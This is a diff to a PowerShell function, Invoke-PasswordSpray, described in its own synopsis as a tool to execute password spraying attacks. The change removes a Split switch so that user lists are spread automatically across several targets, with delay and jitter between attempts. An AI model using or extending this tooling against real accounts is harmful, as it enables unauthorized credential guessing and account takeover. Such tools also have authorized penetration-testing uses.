@@ -2,13 +2,11 @@
   .SYNOPSIS
     Execute a password spraying attack.
   .PARAMETER Targets
-    Target, comma delimited targets, a local targets file, or an online comma delimited targets string.
+    Target, comma delimited targets, a local targets file, or an online comma delimited targets string. If more than one target is specified, the users will be split among the targets.
   .PARAMETER Users
     User, comma delimited users, a local users file, or an online comma delimited users string.
   .PARAMETER Passwords
     Password, comma delimited passwords, a local passwords file, or an online comma delimited passwords string. To be prompted for a password, provide "*" as the password.
-  .PARAMETER Split
-    Split up requests between each target.
   .PARAMETER Delay
     A delay between each authentication attempt, in seconds.
   .PARAMETER Jitter
@@ -23,7 +21,6 @@ function Invoke-PasswordSpray
     [Parameter(Mandatory=$True)]$Targets,
     [Parameter(Mandatory=$True)]$Users,
     [Parameter(Mandatory=$True)]$Passwords,
-    [switch]$Split=$False,
     [double]$Jitter = 0.20,
     [double]$Delay = 0.00
   )
@@ -74,7 +71,7 @@ function Invoke-PasswordSpray
     return $Result
   }
 
-  if($Split)
+  if($Targets.Count -gt 1)
   {
     $SplitUsers = @{}
     $Base = 0
@@ -96,7 +93,7 @@ function Invoke-PasswordSpray
   Write-Host ((Get-Date -Format [hh:mm:ss]) + " Starting Attack... ")
   foreach($Target in $Targets)
   {
-    if($Split){$Arguments = @($Target,$SplitUsers[$Targets.IndexOf($Target)],$Passwords)}
+    if($Targets.Count -gt 1){$Arguments = @($Target,$SplitUsers[$Targets.IndexOf($Target)],$Passwords)}
     else{$Arguments = @($Target,$Users,$Passwords)}
     $Jobs += (Start-Job $ScriptBlock -ArgumentList $Arguments).Name
   }
